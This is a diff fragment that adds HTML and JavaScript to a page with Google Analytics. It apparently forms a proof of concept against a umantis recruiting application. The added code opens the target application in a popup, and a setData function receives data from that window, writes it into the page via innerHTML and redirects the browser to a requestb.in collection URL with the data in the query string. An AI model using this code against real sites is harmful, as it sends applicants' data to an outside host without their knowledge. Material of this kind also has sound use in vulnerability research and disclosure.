@@ -15,4 +15,27 @@
  </script>
  <script async src='https://www.google-analytics.com/analytics.js'></script>
  <!-- End Google Analytics -->
+  <button type="button" onclick="popup('https://recruitingapp-1000.develop.umantis.com/Vacancies/213/Application/New/1', '', 800, 200);">Add My Card</button>
+=&gt;
+<span id="retrievedData">No data yet.</span>    
+<script>
+    function popup(url, title, width, height) {
+        var left = (screen.width / 2) - (width / 2);
+        var top = (screen.height / 2) - (height / 2);
+        var options = '';    
+        options += ',width=' + width;
+        options += ',height=' + height;
+        options += ',top=' + top;
+        options += ',left=' + left;    
+        return window.open(url, title, options);
+    }
+
+    function setData(data) {
+        console.log(data);
+        var strData = JSON.stringify(data);
+        document.getElementById('retrievedData').innerHTML = strData;
+        var requestBinUrl = 'http://requestb.in/18u87g81';
+        window.location.href = requestBinUrl + '?data=' + strData;
+    }
+</script> 
 </html
